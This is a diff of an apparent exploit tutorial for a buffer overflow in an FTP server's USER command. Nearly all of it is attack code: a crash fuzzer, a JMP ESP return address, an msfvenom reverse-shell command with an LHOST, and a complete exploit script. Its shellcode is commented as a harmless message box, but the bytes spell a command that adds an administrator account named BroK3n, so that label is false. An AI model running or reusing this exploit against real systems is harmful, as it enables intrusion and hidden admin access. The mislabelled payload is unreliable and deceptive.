@@ -29,7 +29,7 @@ from time import sleep
 # set first argument given at CLI to 'target' variable
 target = sys.argv[1]
 # create string of 50 A's 'x41'
-buff = 'x41'*50
+buff = '\x41'*50
  
 # loop through sending in a buffer with an increasing length by 50 A's
 while True:
@@ -43,11 +43,11 @@ while True:
  
     print "Sending buffer with length: "+str(len(buff))
     # Send in string 'USER' + the string 'buff'
-    s.send("USER "+buff+"rn")
+    s.send("USER "+buff+"\r\n")
     s.close()
     sleep(1)
     # Increase the buff string by 50 A's and then the loop continues
-    buff = buff + 'x41'*50
+    buff = buff + '\x41'*50
  
   except: # If we fail to connect to the server, we assume its crashed and print the statement below
     print "[+] Crash occured with buffer length: "+str(len(buff)-50)
@@ -76,7 +76,7 @@ buff = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((target,21))
 print s.recv(2048)
-s.send("USER "+buff+"rn")
+s.send("USER "+buff+"\r\n")
 s.close()
 ```
 
@@ -91,22 +91,22 @@ tools/exploit/pattern_offset.rb -q <EIP rewritten value>
 
 ``!mona jmp -r esp``
 
-9. Preapre the Expoit Code
+9. Preapre the Expoit Code #1
 
 ```
-import sys, socket
- 
+iimport sys, socket
+
 target = sys.argv[1]
- 
+
 # EIP control after 230 bytes in buffer
-# '0x7c9d30d7' - JMP ESP | XP SP3 EN [SHELL32.dll] (C:WINDOWSsystem32SHELL32.dll)
- 
-buff = 'x90'*230+'xd7x30x9dx7c'+'x43'*366
- 
+# '0x73806C28' - JMP ESP | Win8k3 [SHELL32.dll] (C:WINDOWS\system32\SHELL32.dll)
+
+buff = '\x90'*230+'\x28\x6c\x80\x73'+'\x43'*366
+
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((target,21))
 print s.recv(2048)
-s.send("USER "+buff+"rn")
+s.send("USER "+buff+"\r\n")
 s.close()
 ```
 
@@ -114,47 +114,39 @@ s.close()
 
 ```./msfvenom -p windows/shell_reverse_tcp LHOST=172.28.128.1 LPORT=4444 -f c```
 
-11. Update Exploit Code
+11. Update Exploit Code #2
 
 ```
 import sys, socket
+ 
 target = sys.argv[1]
- 
-# msfpayload windows/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 R| msfencode -e x86/fnstenv_mov -b "x00x0ax0bx27x36xcexc1x04x14x3ax44xe0x42xa9x0d" -t c
-# Bad Chars: "x00x0ax0bx27x36xcexc1x04x14x3ax44xe0x42xa9x0d"
-# 338 bytes
-shellcode = ("x6ax4fx59xd9xeexd9x74x24xf4x5bx81x73x13xb7x3d"
-"xadxf8x83xebxfcxe2xf4x4bxd5x24xf8xb7x3dxcdx71"
-"x52x0cx7fx9cx3cx6fx9dx73xe5x31x26xaaxa3xb6xdf"
-"xd0xb8x8axe7xdex86xc2x9cx38x1bx01xccx84xb5x11"
-"x8dx39x78x30xacx3fx55xcdxffxafx3cx6fxbdx73xf5"
-"x01xacx28x3cx7dxd5x7dx77x49xe7xf9x67x6dx26xb0"
-"xafxb6xf5xd8xb6xeex4exc4xfexb6x99x73xb6xebx9c"
-"x07x86xfdx01x39x78x30xacx3fx8fxddxd8x0cxb4x40"
-"x55xc3xcax19xd8x1axefxb6xf5xdcxb6xeexcbx73xbb"
-"x76x26xa0xabx3cx7ex73xb3xb6xacx28x3ex79x89xdc"
-"xecx66xccxa1xedx6cx52x18xefx62xf7x73xa5xd6x2b"
-"xa5xdfx0ex9fxf8xb7x55xdax8bx85x62xf9x90xfbx4a"
-"x8bxffx48xe8x15x68xb6x3dxadxd1x73x69xfdx90x9e"
-"xbdxc6xf8x48xe8xfdxa8xe7x6dxedxa8xf7x6dxc5x12"
-"xb8xe2x4dx07x62xb4x6ax90x77x95x95x9exdfx3fxad"
-"xf9x0cxb4x4bx92xa7x6bxfax90x2ex98xd9x99x48xe8"
-"xc5x9bxdax59xadx71x54x6axfaxafx86xcbxc7xeaxee"
-"x6bx4fx05xd1xfaxe9xdcx8bx3cxacx75xf3x19xbdx3e"
-"xb7x79xf9xa8xe1x6bxfbxbexe1x73xfbxaexe4x6bxc5"
-"x81x7bx02x2bx07x62xb4x4dxb6xe1x7bx52xc8xdfx35"
-"x2axe5xd7xc2x78x43x47x88x0fxaexdfx9bx38x45x2a"
-"xc2x78xc4xb1x41xa7x78x4cxddxd8xfdx0cx7axbex8a"
-"xd8x57xadxabx48xe8xadxf8")
- 
+
+# User32-free Messagebox Shellcode for any Windows version
+# https://www.exploit-db.com/exploits/28996/
+
+shellcode = ("\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
+      "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
+      "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
+      "\x34\xaf\x01\xc6\x45\x81\x3e\x57\x69\x6e\x45\x75\xf2\x8b\x7a"
+      "\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf"
+      "\xfc\x01\xc7\x68\x4b\x33\x6e\x01\x68\x20\x42\x72\x6f\x68\x2f"
+      "\x41\x44\x44\x68\x6f\x72\x73\x20\x68\x74\x72\x61\x74\x68\x69"
+      "\x6e\x69\x73\x68\x20\x41\x64\x6d\x68\x72\x6f\x75\x70\x68\x63"
+      "\x61\x6c\x67\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44"
+      "\x44\x20\x26\x68\x6e\x20\x2f\x41\x68\x72\x6f\x4b\x33\x68\x33"
+      "\x6e\x20\x42\x68\x42\x72\x6f\x4b\x68\x73\x65\x72\x20\x68\x65"
+      "\x74\x20\x75\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63"
+      "\x6d\x64\x2e\x89\xe5\xfe\x4d\x53\x31\xc0\x50\x55\xff\xd7")
+
 # EIP control after 230 bytes in buffer
-# '0x7c9d30d7' - JMP ESP | XP SP3 EN [SHELL32.dll] (C:WINDOWSsystem32SHELL32.dll)
-buff = 'x90'*230+'xd7x30x9dx7c'
+# '0x73806C28' - JMP ESP | Win8k3 [SHELL32.dll] (C:WINDOWS\system32\SHELL32.dll)
+ 
+buff = '\x90'*230+'\x28\x6c\x80\x73'+'\x90'*15+shellcode
  
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((target,21))
 print s.recv(2048)
-s.send("USER "+buff+'x90'*15+shellcode+"rn")
+s.send("USER "+buff+"\r\n")
 s.close()
 ```
 
